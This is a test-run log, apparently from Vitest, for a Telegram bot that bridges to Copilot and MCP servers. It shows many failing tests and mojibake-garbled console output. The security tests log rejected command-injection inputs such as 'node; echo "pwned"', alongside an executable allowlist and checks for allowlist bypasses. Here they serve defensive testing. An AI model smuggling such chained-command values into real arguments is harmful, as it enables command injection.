2026-02-12T17:11:46.701Z [[33mwarn[39m]: MCP executable rejected by allowlist {"userId":1,"command":"npm","basename":"npm","allowedExecutables":["node","node.exe","python","python.exe","python3","python3.exe","npx","npx.cmd","deno","deno.exe","bun","bun.exe"]}

 [31mÃ”Ã˜Â»[39m tests/security-integration.test.ts [2m ([22m[2m7 tests[22m [2m|[22m [31m1 failed[39m[2m)[22m[33m 537[2mms[22m[39m
[31m   [31mâ”œÃ¹[31m Security Fixes Integration Tests[2m > [22mshould handle all security scenarios in end-to-end flow[39m
[31m     Ã”Ã¥Ã† expected undefined not to be undefined[39m
 [32mÃ”Â£Ã´[39m tests/commands-registration.test.ts [2m ([22m[2m3 tests[22m[2m)[22m[90m 26[2mms[22m[39m
[90mstdout[2m | tests/security-fixes.test.ts[2m > [22m[2mSecurity and Architecture Fixes[2m > [22m[2mFix #1: Command Injection Prevention[2m > [22m[2mshould safely check for existing commands without shell interpretation[22m[39m
2026-02-12T17:11:46.460Z [[33mwarn[39m]: MCP executable rejected due to dangerous characters {"userId":1,"command":"node; echo \"pwned\""}

[90mstdout[2m | tests/security-fixes.test.ts[2m > [22m[2mSecurity and Architecture Fixes[2m > [22m[2mFix #1: Command Injection Prevention[2m > [22m[2mshould handle command names with special characters safely[22m[39m
2026-02-12T17:11:46.470Z [[33mwarn[39m]: MCP executable rejected due to dangerous characters {"userId":1,"command":"test$command"}

[90mstdout[2m | tests/security-fixes.test.ts[2m > [22m[2mSecurity and Architecture Fixes[2m > [22m[2mFix #5: URL Protocol Validation[2m > [22m[2mshould accept valid https URLs[22m[39m
2026-02-12T17:11:46.493Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"https-server","serverType":"http"}

[90mstdout[2m | tests/security-fixes.test.ts[2m > [22m[2mSecurity and Architecture Fixes[2m > [22m[2mFix #3: Quote-Aware Argument Parsing[2m > [22m[2mshould handle simple space-separated arguments[22m[39m
2026-02-12T17:11:46.504Z [[32minfo[39m]: Wizard started {"userId":1}

[90mstdout[2m | tests/security-fixes.test.ts[2m > [22m[2mSecurity and Architecture Fixes[2m > [22m[2mFix #3: Quote-Aware Argument Parsing[2m > [22m[2mshould handle quoted arguments with spaces[22m[39m
2026-02-12T17:11:46.508Z [[32minfo[39m]: Wizard started {"userId":1}

[90mstdout[2m | tests/security-fixes.test.ts[2m > [22m[2mSecurity and Architecture Fixes[2m > [22m[2mFix #3: Quote-Aware Argument Parsing[2m > [22m[2mshould handle single-quoted arguments[22m[39m
2026-02-12T17:11:46.511Z [[32minfo[39m]: Wizard started {"userId":1}

[90mstdout[2m | tests/security-fixes.test.ts[2m > [22m[2mSecurity and Architecture Fixes[2m > [22m[2mFix #3: Quote-Aware Argument Parsing[2m > [22m[2mshould handle mixed quoted and unquoted arguments[22m[39m
2026-02-12T17:11:46.514Z [[32minfo[39m]: Wizard started {"userId":1}

[90mstdout[2m | tests/security-fixes.test.ts[2m > [22m[2mSecurity and Architecture Fixes[2m > [22m[2mFix #3: Quote-Aware Argument Parsing[2m > [22m[2mshould handle escaped quotes within quoted strings[22m[39m
2026-02-12T17:11:46.517Z [[32minfo[39m]: Wizard started {"userId":1}

[90mstdout[2m | tests/security-fixes.test.ts[2m > [22m[2mSecurity and Architecture Fixes[2m > [22m[2mFix #3: Quote-Aware Argument Parsing[2m > [22m[2mshould handle empty arguments[22m[39m
2026-02-12T17:11:46.520Z [[32minfo[39m]: Wizard started {"userId":1}

[90mstdout[2m | tests/security-fixes.test.ts[2m > [22m[2mSecurity and Architecture Fixes[2m > [22m[2mFix #3: Quote-Aware Argument Parsing[2m > [22m[2mshould handle arguments with equals signs[22m[39m
2026-02-12T17:11:46.523Z [[32minfo[39m]: Wizard started {"userId":1}

[90mstdout[2m | tests/security-fixes.test.ts[2m > [22m[2mSecurity and Architecture Fixes[2m > [22m[2mFix #2: ServerWizard Public API[2m > [22m[2mshould allow service access without type casting[22m[39m
2026-02-12T17:11:46.818Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"test-via-wizard","serverType":"stdio"}

 [31mÃ”Ã˜Â»[39m tests/security-fixes.test.ts [2m ([22m[2m17 tests[22m [2m|[22m [31m1 failed[39m[2m)[22m[33m 378[2mms[22m[39m
[31m   [31mâ”œÃ¹[31m Security and Architecture Fixes[2m > [22mFix #5: URL Protocol Validation[2m > [22mshould accept valid http URLs[39m
[31m     Ã”Ã¥Ã† expected false to be true // Object.is equality[39m
 [31mÃ”Ã˜Â»[39m tests/sanitize.test.ts [2m ([22m[2m14 tests[22m [2m|[22m [31m1 failed[39m[2m)[22m[90m 40[2mms[22m[39m
[31m   [31mâ”œÃ¹[31m sanitizeForLogging[2m > [22mshould handle null and undefined values[39m
[31m     Ã”Ã¥Ã† expected null to be undefined // Object.is equality[39m
[90mstdout[2m | tests/session-manager.test.ts[2m > [22m[2mSessionManager[2m > [22m[2mevicts sessions when over limit[22m[39m
2026-02-12T17:11:47.175Z [[32minfo[39m]: Creating new session {"userId":"user","projectPath":"C:\\temp\\one","model":"gpt-5-mini","toolsCount":0,"mcpServersCount":0,"hasSystemMessage":false}
2026-02-12T17:11:47.182Z [[32minfo[39m]: Session created successfully {"userId":"user","projectPath":"C:\\temp\\one","sessionCount":1}
2026-02-12T17:11:47.183Z [[32minfo[39m]: Max sessions reached, destroying oldest session {"userId":"user","oldestProjectPath":"C:\\temp\\one","maxSessions":1}
2026-02-12T17:11:47.183Z [[32minfo[39m]: Creating new session {"userId":"user","projectPath":"C:\\temp\\two","model":"gpt-5-mini","toolsCount":0,"mcpServersCount":0,"hasSystemMessage":false}
2026-02-12T17:11:47.184Z [[32minfo[39m]: Session created successfully {"userId":"user","projectPath":"C:\\temp\\two","sessionCount":1}

 [32mÃ”Â£Ã´[39m tests/types-logger.test.ts [2m ([22m[2m14 tests[22m[2m)[22m[90m 33[2mms[22m[39m
 [32mÃ”Â£Ã´[39m tests/types-database.test.ts [2m ([22m[2m13 tests[22m[2m)[22m[90m 19[2mms[22m[39m
[90mstdout[2m | tests/session-manager.test.ts[2m > [22m[2mSessionManager[2m > [22m[2msession metadata[2m > [22m[2mreturns list of sessions with timestamps[22m[39m
2026-02-12T17:11:47.575Z [[32minfo[39m]: Creating new session {"userId":"user123","projectPath":"C:\\temp\\one","model":"gpt-5-mini","toolsCount":0,"mcpServersCount":0,"hasSystemMessage":false}
2026-02-12T17:11:47.575Z [[32minfo[39m]: Session created successfully {"userId":"user123","projectPath":"C:\\temp\\one","sessionCount":1}

 [32mÃ”Â£Ã´[39m tests/safe-logger.test.ts [2m ([22m[2m8 tests[22m[2m)[22m[90m 89[2mms[22m[39m
 [32mÃ”Â£Ã´[39m tests/types-integration.test.ts [2m ([22m[2m15 tests[22m[2m)[22m[90m 37[2mms[22m[39m
[90mstdout[2m | tests/session-manager.test.ts[2m > [22m[2mSessionManager[2m > [22m[2msession metadata[2m > [22m[2mreturns list of sessions with timestamps[22m[39m
2026-02-12T17:11:47.638Z [[32minfo[39m]: Creating new session {"userId":"user123","projectPath":"C:\\temp\\two","model":"gpt-5-mini","toolsCount":0,"mcpServersCount":0,"hasSystemMessage":false}
2026-02-12T17:11:47.639Z [[32minfo[39m]: Session created successfully {"userId":"user123","projectPath":"C:\\temp\\two","sessionCount":2}

 [32mÃ”Â£Ã´[39m tests/session-manager.test.ts [2m ([22m[2m6 tests[22m[2m)[22m[33m 802[2mms[22m[39m
 [32mÃ”Â£Ã´[39m tests/telegram-retry.test.ts [2m ([22m[2m13 tests[22m[2m)[22m[33m 491[2mms[22m[39m
 [32mÃ”Â£Ã´[39m tests/types-tools.test.ts [2m ([22m[2m11 tests[22m[2m)[22m[90m 16[2mms[22m[39m
[90mstdout[2m | tests/commands-status.test.ts[2m > [22m[2m/status command[2m > [22m[2mshows multiple sessions with timestamps[22m[39m
2026-02-12T17:11:47.990Z [[32minfo[39m]: Creating new session {"userId":"user123","projectPath":"C:\\temp\\project1","model":"gpt-5-mini","toolsCount":0,"mcpServersCount":0,"hasSystemMessage":false}
2026-02-12T17:11:47.996Z [[32minfo[39m]: Session created successfully {"userId":"user123","projectPath":"C:\\temp\\project1","sessionCount":1}

[90mstdout[2m | tests/commands-status.test.ts[2m > [22m[2m/status command[2m > [22m[2mshows multiple sessions with timestamps[22m[39m
2026-02-12T17:11:48.057Z [[32minfo[39m]: Creating new session {"userId":"user123","projectPath":"C:\\temp\\project2","model":"gpt-5-mini","toolsCount":0,"mcpServersCount":0,"hasSystemMessage":false}
2026-02-12T17:11:48.058Z [[32minfo[39m]: Session created successfully {"userId":"user123","projectPath":"C:\\temp\\project2","sessionCount":2}

 [32mÃ”Â£Ã´[39m tests/commands-status.test.ts [2m ([22m[2m4 tests[22m[2m)[22m[33m 649[2mms[22m[39m
 [32mÃ”Â£Ã´[39m tests/model-unification.test.ts [2m ([22m[2m6 tests[22m[2m)[22m[90m 15[2mms[22m[39m
 [32mÃ”Â£Ã´[39m tests/mock-verification.test.ts [2m ([22m[2m2 tests[22m[2m)[22m[90m 15[2mms[22m[39m
 [32mÃ”Â£Ã´[39m tests/config-empty-string.test.ts [2m ([22m[2m9 tests[22m[2m)[22m[90m 43[2mms[22m[39m
 [32mÃ”Â£Ã´[39m tests/rate-limit.test.ts [2m ([22m[2m2 tests[22m[2m)[22m[90m 18[2mms[22m[39m
 [32mÃ”Â£Ã´[39m tests/time.test.ts [2m ([22m[2m5 tests[22m[2m)[22m[90m 10[2mms[22m[39m
 [31mÃ”Ã˜Â»[39m tests/mcp-registry.test.ts [2m ([22m[2m2 tests[22m [2m|[22m [31m2 failed[39m[2m)[22m[33m 406[2mms[22m[39m
[31m   [31mâ”œÃ¹[31m McpRegistry[2m > [22mloads servers from config file and toggles[39m
[31m     Ã”Ã¥Ã† expected +0 to be 1 // Object.is equality[39m
[31m   [31mâ”œÃ¹[31m McpRegistry[2m > [22mpublic load() method reloads servers from database[39m
[31m     Ã”Ã¥Ã† expected +0 to be 1 // Object.is equality[39m
 [32mÃ”Â£Ã´[39m tests/config.test.ts [2m ([22m[2m3 tests[22m[2m)[22m[90m 152[2mms[22m[39m
 [32mÃ”Â£Ã´[39m tests/formatter.test.ts [2m ([22m[2m2 tests[22m[2m)[22m[90m 6[2mms[22m[39m
 [32mÃ”Â£Ã´[39m tests/message-splitter.test.ts [2m ([22m[2m2 tests[22m[2m)[22m[90m 5[2mms[22m[39m
 [32mÃ”Â£Ã´[39m tests/user-state.test.ts [2m ([22m[2m1 test[22m[2m)[22m[90m 117[2mms[22m[39m

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â» Failed Suites 1 Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»

 FAIL  tests/tarea-4-5-ci-cd.test.ts [ tests/tarea-4-5-ci-cd.test.ts ]
ReferenceError: beforeEach is not defined
 Ã”Ã˜Â» tests/tarea-4-5-ci-cd.test.ts:29:5
     27|     let ciContent: string;
     28| 
     29|     beforeEach(() => {
       |     ^
     30|       if (existsSync(ciPath)) {
     31|         ciContent = readFileSync(ciPath, 'utf8');

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[1/182]Ã”Ã„Â»

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â» Failed Tests 156 Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»

 FAIL  tests/allowlist-bypass-commands-fix.test.ts > Allowlist Bypass Fix - /plan and /exitplan Commands > /plan command security > should block /plan when cwd is not in allowlist
 FAIL  tests/allowlist-bypass-commands-fix.test.ts > Allowlist Bypass Fix - /plan and /exitplan Commands > /plan command security > should allow /plan when cwd is in allowlist
 FAIL  tests/allowlist-bypass-commands-fix.test.ts > Allowlist Bypass Fix - /plan and /exitplan Commands > /exitplan command security > should block /exitplan when cwd is not in allowlist
 FAIL  tests/allowlist-bypass-commands-fix.test.ts > Allowlist Bypass Fix - /plan and /exitplan Commands > /exitplan command security > should allow /exitplan when cwd is in allowlist
 FAIL  tests/allowlist-bypass-commands-fix.test.ts > Allowlist Bypass Fix - /plan and /exitplan Commands > Bypass scenarios for plan commands > should block /plan with configured DB but empty .env allowlist
 FAIL  tests/allowlist-bypass-commands-fix.test.ts > Allowlist Bypass Fix - /plan and /exitplan Commands > Bypass scenarios for plan commands > should block /exitplan with configured DB but empty .env allowlist
 FAIL  tests/allowlist-bypass-commands-fix.test.ts > Allowlist Bypass Fix - /plan and /exitplan Commands > Integration with existing security checks > should maintain existing /cd security checks
 FAIL  tests/allowlist-bypass-commands-fix.test.ts > Allowlist Bypass Fix - /plan and /exitplan Commands > Integration with existing security checks > should maintain existing /switch security checks
 FAIL  tests/allowlist-bypass-commands-fix.test.ts > Allowlist Bypass Fix - /plan and /exitplan Commands > Integration with existing security checks > should maintain existing callback security checks
 FAIL  tests/allowlist-bypass-commands-fix.test.ts > Allowlist Bypass Fix - /plan and /exitplan Commands > Complete security coverage verification > all switchProject calls should have allowlist validation
Error: Cannot find module '../src/config'
Require stack:
- D:\Juanma\MCP Copilot Telegram\tests\allowlist-bypass-commands-fix.test.ts
 Ã”Ã˜Â» tests/allowlist-bypass-commands-fix.test.ts:16:29
     14|   beforeEach(() => {
     15|     // Save current state
     16|     originalAllowlist = [...require('../src/config').allowedPaths];
       |                             ^
     17|   });
     18|   

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[2/182]Ã”Ã„Â»

 FAIL  tests/allowlist-bypass-commands-fix.test.ts > Allowlist Bypass Fix - /plan and /exitplan Commands > /plan command security > should block /plan when cwd is not in allowlist
 FAIL  tests/allowlist-bypass-commands-fix.test.ts > Allowlist Bypass Fix - /plan and /exitplan Commands > /plan command security > should allow /plan when cwd is in allowlist
 FAIL  tests/allowlist-bypass-commands-fix.test.ts > Allowlist Bypass Fix - /plan and /exitplan Commands > /exitplan command security > should block /exitplan when cwd is not in allowlist
 FAIL  tests/allowlist-bypass-commands-fix.test.ts > Allowlist Bypass Fix - /plan and /exitplan Commands > /exitplan command security > should allow /exitplan when cwd is in allowlist
 FAIL  tests/allowlist-bypass-commands-fix.test.ts > Allowlist Bypass Fix - /plan and /exitplan Commands > Bypass scenarios for plan commands > should block /plan with configured DB but empty .env allowlist
 FAIL  tests/allowlist-bypass-commands-fix.test.ts > Allowlist Bypass Fix - /plan and /exitplan Commands > Bypass scenarios for plan commands > should block /exitplan with configured DB but empty .env allowlist
 FAIL  tests/allowlist-bypass-commands-fix.test.ts > Allowlist Bypass Fix - /plan and /exitplan Commands > Integration with existing security checks > should maintain existing /cd security checks
 FAIL  tests/allowlist-bypass-commands-fix.test.ts > Allowlist Bypass Fix - /plan and /exitplan Commands > Integration with existing security checks > should maintain existing /switch security checks
 FAIL  tests/allowlist-bypass-commands-fix.test.ts > Allowlist Bypass Fix - /plan and /exitplan Commands > Integration with existing security checks > should maintain existing callback security checks
 FAIL  tests/allowlist-bypass-commands-fix.test.ts > Allowlist Bypass Fix - /plan and /exitplan Commands > Complete security coverage verification > all switchProject calls should have allowlist validation
TypeError: Cannot read properties of undefined (reading 'join')
 Ã”Ã˜Â» Module.setAllowedPaths src/config.ts:314:37
    312|  */
    313| export function setAllowedPaths(paths: string[]): void {
    314|   process.env.ALLOWED_PATHS = paths.join(',');
       |                                     ^
    315| }
    316| 
 Ã”Ã˜Â» tests/allowlist-bypass-commands-fix.test.ts:21:5

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[3/182]Ã”Ã„Â»

 FAIL  tests/allowlist-graceful-shutdown.test.ts > AllowlistSetupWizard - Graceful Shutdown (Issue #5) > Shutdown Timeout (10s Safety) > should exit with code 1 when shutdown timeout is exceeded
AssertionError: expected "spy" to be called at least once
 Ã”Ã˜Â» tests/allowlist-graceful-shutdown.test.ts:177:28
    175|       // For now, just verify exit was called
    176|       // Once implemented, we'll verify the exit code
    177|       expect(process.exit).toHaveBeenCalled();
       |                            ^
    178|     });
    179|   });

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[4/182]Ã”Ã„Â»

 FAIL  tests/async-io.test.ts > Async I/O Operations > McpRegistry async file operations > should not block event loop during large file reads
AssertionError: expected true to be false // Object.is equality

- Expected
+ Received

- false
+ true

 Ã”Ã˜Â» tests/async-io.test.ts:127:32
    125| 
    126|       // Event loop should remain responsive
    127|       expect(eventLoopBlocked).toBe(false);
       |                                ^
    128|       expect(registry.list().length).toBe(100);
    129|     });

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[5/182]Ã”Ã„Â»

 FAIL  tests/async-io.test.ts > Async I/O Operations > path-setup async operations > should not block event loop during env file update
AssertionError: expected true to be false // Object.is equality

- Expected
+ Received

- false
+ true

 Ã”Ã˜Â» tests/async-io.test.ts:176:34
    174|         
    175|         clearTimeout(timer);
    176|         expect(eventLoopBlocked).toBe(false);
       |                                  ^
    177|       } finally {
    178|         process.chdir(originalCwd);

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[6/182]Ã”Ã„Â»

 FAIL  tests/async-io.test.ts > Async I/O Operations > database async initialization > should create database directory asynchronously
TypeError: db.close is not a function
 Ã”Ã˜Â» tests/async-io.test.ts:213:10
    211|       expect(stats.isDirectory()).toBe(true);
    212|       
    213|       db.close();
       |          ^
    214|     });
    215|   });

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[7/182]Ã”Ã„Â»

 FAIL  tests/atomic-lock-integration.test.ts > Message Handler - Timeout Extension Lock Integration > Memory Leak Prevention > should not leak locks over many extension cycles
 FAIL  tests/auto-extension.test.ts > Auto-Extension Logic > Auto-extension triggers at 70% of timeout > should trigger auto-extension at 70% of initial timeout with recent activity
 FAIL  tests/integration/telegram-e2e.test.ts > E2E Bot Tests > Plan Mode Flow > should activate and deactivate plan mode: /plan Ã”Ã¥Ã† approval Ã”Ã¥Ã† /exitplan
 FAIL  tests/integration/telegram-e2e.test.ts > E2E Bot Tests > Plan Mode Flow > should exit plan mode when changing directory with /cd
Error: Test timed out in 5000ms.
If this is a long-running test, pass a timeout value as the last argument or configure it globally with "testTimeout".
Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[8/182]Ã”Ã„Â»

 FAIL  tests/bot-callbacks.test.ts > Bot Callbacks > Model Change Callback > should change model successfully with valid model
AssertionError: expected "spy" to be called with arguments: [ '123456' ]

Received: 



Number of calls: 0

 Ã”Ã˜Â» tests/bot-callbacks.test.ts:172:41
    170|       const ctx = await executeCallback('model:claude-opus-4.6');
    171|       
    172|       expect(mockSessionManager.isBusy).toHaveBeenCalledWith('123456');
       |                                         ^
    173|       expect(mockSessionManager.setBusy).toHaveBeenCalledWith('123456'Ã”Ã‡Âª
    174|       expect(mockUserState.setCurrentModel).toHaveBeenCalledWith('1234Ã”Ã‡Âª

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[9/182]Ã”Ã„Â»

 FAIL  tests/bot-callbacks.test.ts > Bot Callbacks > Model Change Callback > should reject invalid model
AssertionError: expected "spy" to be called with arguments: [ 'Modelo invâ”œÃ­lido' ]

Received: 

  1st spy call:

- Array [
-   "Modelo invâ”œÃ­lido",
- ]
+ Array []


Number of calls: 1

 Ã”Ã˜Â» tests/bot-callbacks.test.ts:191:39
    189|       const ctx = await executeCallback('model:invalid-model');
    190|       
    191|       expect(ctx.answerCallbackQuery).toHaveBeenCalledWith('Modelo invÃ”Ã‡Âª
       |                                       ^
    192|       expect(mockSessionManager.recreateActiveSession).not.toHaveBeenCÃ”Ã‡Âª
    193|     });

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[10/182]Ã”Ã„Â»

 FAIL  tests/bot-callbacks.test.ts > Bot Callbacks > Model Change Callback > should reject when session is busy
AssertionError: expected "spy" to be called with arguments: [ 'Operaciâ”œâ”‚n en curso' ]

Received: 

  1st spy call:

- Array [
-   "Operaciâ”œâ”‚n en curso",
- ]
+ Array []


Number of calls: 1

 Ã”Ã˜Â» tests/bot-callbacks.test.ts:200:39
    198|       const ctx = await executeCallback('model:claude-sonnet-4.5');
    199|       
    200|       expect(ctx.answerCallbackQuery).toHaveBeenCalledWith('Operaciâ”œâ”‚n Ã”Ã‡Âª
       |                                       ^
    201|       expect(mockSessionManager.recreateActiveSession).not.toHaveBeenCÃ”Ã‡Âª
    202|     });

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[11/182]Ã”Ã„Â»

 FAIL  tests/bot-callbacks.test.ts > Bot Callbacks > Model Change Callback > should log errors and answer callback on failure
AssertionError: expected "spy" to be called with arguments: [ Ã”Ã‡Âª(2) ]

Received: 



Number of calls: 0

 Ã”Ã˜Â» tests/bot-callbacks.test.ts:210:28
    208|       const ctx = await executeCallback('model:gpt-5');
    209|       
    210|       expect(logger.error).toHaveBeenCalledWith('Failed to change modeÃ”Ã‡Âª
       |                            ^
    211|         telegramId: '123456',
    212|         model: 'gpt-5',

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[12/182]Ã”Ã„Â»

 FAIL  tests/bot-callbacks.test.ts > Bot Callbacks > Model Change Callback > should always clear busy state in finally block
AssertionError: expected "spy" to be called with arguments: [ '123456', false ]

Received: 



Number of calls: 0

 Ã”Ã˜Â» tests/bot-callbacks.test.ts:225:42
    223|       await executeCallback('model:claude-sonnet-4.5');
    224|       
    225|       expect(mockSessionManager.setBusy).toHaveBeenCalledWith('123456'Ã”Ã‡Âª
       |                                          ^
    226|     });
    227|   });

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[13/182]Ã”Ã„Â»

 FAIL  tests/bot-callbacks.test.ts > Bot Callbacks > Project Switch Callback > should switch project successfully
AssertionError: expected "spy" to be called with arguments: [ '123456', 'test-project' ]

Received: 



Number of calls: 0

 Ã”Ã˜Â» tests/bot-callbacks.test.ts:233:44
    231|       const ctx = await executeCallback('project_switch:test-project');
    232|       
    233|       expect(mockUserState.getProjectPath).toHaveBeenCalledWith('12345Ã”Ã‡Âª
       |                                            ^
    234|       expect(config.isPathAllowed).toHaveBeenCalledWith('/test/projectÃ”Ã‡Âª
    235|       expect(fs.access).toHaveBeenCalledWith('/test/project');

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[14/182]Ã”Ã„Â»

 FAIL  tests/bot-callbacks.test.ts > Bot Callbacks > Project Switch Callback > should reject non-existent project
AssertionError: expected "spy" to be called with arguments: [ 'Proyecto no encontrado' ]

Received: 

  1st spy call:

- Array [
-   "Proyecto no encontrado",
- ]
+ Array []


Number of calls: 1

 Ã”Ã˜Â» tests/bot-callbacks.test.ts:255:39
    253|       const ctx = await executeCallback('project_switch:nonexistent');
    254|       
    255|       expect(ctx.answerCallbackQuery).toHaveBeenCalledWith('Proyecto nÃ”Ã‡Âª
       |                                       ^
    256|       expect(mockSessionManager.switchProject).not.toHaveBeenCalled();
    257|     });

Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»Ã”Ã„Â»[15/182]Ã”Ã„Â»

 FAIL  tests/bot-callbacks.test.ts > Bot Callbacks > Project Switch Callback > should reject path outside allowlist
AssertionError: expected "spy" to be called with arguments: [ 'Ruta no permitida' ]

Received: 

  1st spy call:

- Array [
-   "Ruta no permitida",
- ]
+ Array []


Number of calls: 1

 Ã”Ã˜Â» tests/bot-callbacks.test.ts:264:39
    262|       const ctx = await executeCallback('project_switch:forbidden-projÃ”Ã‡Âª
    263|       
